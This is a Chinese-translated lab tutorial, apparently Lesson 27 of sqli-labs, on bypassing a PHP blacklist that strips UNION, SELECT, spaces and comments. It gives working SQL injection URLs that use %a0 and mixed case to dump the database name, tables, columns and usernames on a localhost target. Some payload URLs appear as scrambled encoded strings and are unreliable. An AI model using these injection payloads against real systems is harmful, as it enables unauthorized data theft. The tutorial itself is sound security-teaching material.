@@ -1,0 +1,112 @@
+
+# [翻译]如何手动绕过SQL注入过滤器？（三）
+
+**Lesson 27**
+
+本节延续上一节([传送门](http://bbs.pediy.com/thread-219146.htm "如何手动绕过SQL注入过滤器？（二）"))。难度愈发的大了，因为这次被过滤掉的有`UNION`/`union`，`SELECT`/`select`，空格和注释。还是老方法，寻找替代品来绕过它！
+
+```php
+function blacklist($id)
+
+$id=preg_replace('/[\/\\*]/',"",$id);               //strip out /\*
+
+$id=preg_replace('/[-]/',"",$id);                   //strip out -
+
+$id=preg_replace('/[#]/',"",$id);                  //strip out #
+
+$id=preg_replace('/union/s',"",$id);           //strip out union
+
+$id=preg_replace('/select/s',"",$id);           //strip out select
+
+$id=preg_replace('/UNION/s',"",$id);        //strip out UNION
+
+$id=preg_replace('/SELECT/s',"",$id);        //strip out SELECT
+
+$id=preg_replace('/Union/s',"",$id);         //strip out Union
+
+$id=preg_replace('/Select/s',"",$id);         //strip out Select
+```
+
+首先打开浏览器，输入**http://localhost:81/sqli/Less-27/?id=1' AND'1=1**（注：具体以个人配置为准）
+
+[![](https://bbs.kanxue.com/upload/attach/201707/747240_hb07jt1ux3i13y1.png)](https://bbs.kanxue.com/upload/attach/201707/747240_hb07jt1ux3i13y1.png)
+
+由上图可以看出，空格被过滤掉了。
+
+现在来看看如何绕过`UNION`/`union`，`SELECT`/`select`和空格过滤器：
+
+**http://localhost:81/sqli/Less-27/?id=0'%a0UnIon%a0SeLect%a01,2,3%a0AND'1=1**
+
+[![](https://bbs.kanxue.com/upload/attach/201707/747240_x61tfra70538jnq.png)](https://bbs.kanxue.com/upload/attach/201707/747240_x61tfra70538jnq.png)
+
+由上图可以看出，显然我们成功了。（注：此图为译者所截，原文此处有误）
+
+如果你已经明白了上面的方法，那么接下来开始获取数据库信息：
+
+**http://localhost:81/sqli/Less-27/?id=0'%a0UnIon%a0SeLect%a01,database(),3%a0AND'1=1**
+
+[![](https://bbs.kanxue.com/upload/attach/201707/747240_fvpmk3cvs0qvua1.png)](https://bbs.kanxue.com/upload/attach/201707/747240_fvpmk3cvs0qvua1.png)
+
+由上图可以看出，数据库名为`security`。
+
+接着来看看数据库中有哪些表：
+
+**996K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3I4G2j5$3q4D9K9r3!0K6N6q4)9K6b7e0R3I4i4K6u0r3M7%4q4D9K9g2)9J5c8V1I4W2M7%4y4Q4x3X3b7J5y4#2)9J5c8W2)9K6c8X3W2V1i4K6y4p5x3q4)9J5y4W2)9J5x3K6x3&6i4K6y4n7i4K6t1#2j5e0m8g2L8V1W2G2L8W2)9J5y4h3p5H3f1$3g2x3k6h3y4@1i4K6t1#2j5e0l9I4i4K6u0o6k6%4u0G2N6i4m8Q4y4h3k6U0L8$3&6U0j5i4c8Q4x3U0S2@1j5h3u0D9k6g2)9#2k6X3&6S2L8h3g2Q4x3U0W2Q4x3V1x3K6i4K6t1#2j5e0m8X3M7X3!0E0i4K6t1#2j5e0m8A6L8X3k6G2M7X3#2S2N6r3W2G2L8W2)9#2k6Y4y4U0K9r3g2E0j5g2)9J5k6i4c8S2j5X3I4W2M7#2)9J5y4h3p5H3N6$3S2W2M7X3g2Q4x3U0g2S2x3s2c8S2j5X3I4W2i4K6g2X3M7$3y4Z5k6h3#2S2i4K6y4p5k6r3q4@1j5h3u0S2M7$3g2Q4x3U0S2Q4x3U0W2Q4x3U0g2S2x3p5q4z5c8q4)9J5y4W2)9J5x3K6x3&6i4K6y4n7x3g2)9K6c8o6p5.**
+
+[![](https://bbs.kanxue.com/upload/attach/201707/747240_81sxrjprrh0xpcg.png)](https://bbs.kanxue.com/upload/attach/201707/747240_81sxrjprrh0xpcg.png)
+
+由上图可以看出，当前的表名有：
+
+T1: emails
+
+T2: referers
+
+T3: uagents
+
+T4: users
+
+接着来看看表`users`中有哪些列：
+
+**ce7K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3I4G2j5$3q4D9K9r3!0K6N6q4)9K6b7e0R3I4i4K6u0r3M7%4q4D9K9g2)9J5c8V1I4W2M7%4y4Q4x3X3b7J5y4#2)9J5c8W2)9K6c8X3W2V1i4K6y4p5x3q4)9J5y4W2)9J5x3K6x3&6i4K6y4n7i4K6t1#2j5e0m8g2L8V1W2G2L8W2)9J5y4h3p5H3f1$3g2x3k6h3y4@1i4K6t1#2j5e0l9I4i4K6u0o6k6%4u0G2N6i4m8Q4y4h3k6U0L8$3&6U0j5i4c8Q4x3U0S2U0L8$3I4#2L8h3&6Q4y4h3k6F1j5h3#2W2i4K6t1&6i4K6u0o6x3#2)9J5y4h3p5H3k6Y4u0G2L8g2)9J5y4h3p5H3K9h3&6X3L8%4u0E0j5i4c8A6L8$3&6Q4y4h3k6K6j5$3S2W2L8h3q4Q4x3X3g2U0L8$3I4#2L8h3&6K6i4K6t1#2j5e0m8%4K9r3g2J5k6g2)9J5y4h3p5H3N6r3q4T1L8r3g2Q4y4h3k6F1j5h3#2W2i4K6y4p5i4K6t1$3i4K6t1K6x3K6W2Q4x3@1u0#2M7$3g2J5M7#2)9J5y4W2)9J5x3K6x3&6i4K6y4n7i4K6t1#2j5e0m8m8e0V1c8Q4x3U0k6Q4x3U0x3K6z5g2)9K6b7U0q4Q4x3@1b7I4**
+
+[![](https://bbs.kanxue.com/upload/attach/201707/747240_d1x1wtufxobktp4.png)](https://bbs.kanxue.com/upload/attach/201707/747240_d1x1wtufxobktp4.png)
+
+由上图可以看出，该表包含了三列，分别是：
+
+C1: id
+
+C2: username
+
+C3: password
+
+在本节的最后，一起来看看表`users`中的`username`有哪些：
+
+**http://localhost:81/sqli/Less-27/?id=0'%a0UnIon%a0SeLect%a01,group\_concat(username),3%a0from%a0users%a0where%a0'1=1**
+
+[![](https://bbs.kanxue.com/upload/attach/201707/747240_ljhgsnuv4v6qzo1.png)](https://bbs.kanxue.com/upload/attach/201707/747240_ljhgsnuv4v6qzo1.png)
+
+由上图可以看出，`username`有`Dumb`，`Angelina`，`Dummy`，`secure`，`stupid`，`superman`，`batman`，`admin`，`admin1`，`admin2`，`admin3`，`dhakkan`，`admin4`。
+
+**小结**：在第二十七节，我们学习了如何绕过`UNION`/`union`，`SELECT`/`select`，空格和注释过滤器来获取数据库中的信息。
+
+## 相关文章
+
+[如何手动绕过SQL注入过滤器？（一）](http://bbs.pediy.com/thread-219137.htm "如何手动绕过SQL注入过滤器？（一）")
+
+[如何手动绕过SQL注入过滤器？（二）](http://bbs.pediy.com/thread-219146.htm "如何手动绕过SQL注入过滤器？（二）")
+
+[SQL注入新手教程（第一部分）](http://bbs.pediy.com/thread-218235.htm "SQL注入新手教程（第一部分）")
+
+[SQL注入新手教程（第二部分）](http://bbs.pediy.com/thread-219115.htm "SQL注入新手教程（第二部分）")
+
+[一步步手动进行SQL注入](http://bbs.pediy.com/thread-219096.htm "一步步手动进行SQL注入")
+
+[基于表单的SQL注入（手动）](http://bbs.pediy.com/thread-219156.htm "基于表单的SQL注入（手动）")
+
+[使用OUTFILE导出数据库数据](http://bbs.pediy.com/thread-219176.htm "使用OUTFILE导出数据库数据")
+
+原文链接：[a54K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3S2S2j5$3E0A6L8X3N6S2M7Y4c8A6j5$3I4W2M7#2)9J5k6h3W2F1i4K6u0r3j5Y4W2H3j5i4y4K6i4K6u0V1k6X3W2D9N6r3g2J5i4K6u0V1M7%4q4D9i4K6u0V1K9h3&6B7k6h3y4@1K9h3!0F1i4K6u0V1L8h3q4F1N6h3q4D9L8s2W2Q4x3V1j5`.](https://bbs.kanxue.com/elink@c62K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3S2S2j5$3E0A6L8X3N6S2M7Y4c8A6j5$3I4W2M7#2)9J5k6h3W2F1i4K6u0r3j5Y4W2H3j5i4y4K6i4K6u0V1k6X3W2D9N6r3g2J5i4K6u0V1M7%4q4D9i4K6u0V1K9h3&6B7k6h3y4@1K9h3!0F1i4K6u0V1L8h3q4F1N6h3q4D9L8s2W2Q4x3V1j5`)
+
+本文由 看雪翻译小组 hesir 编译
+
+[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)
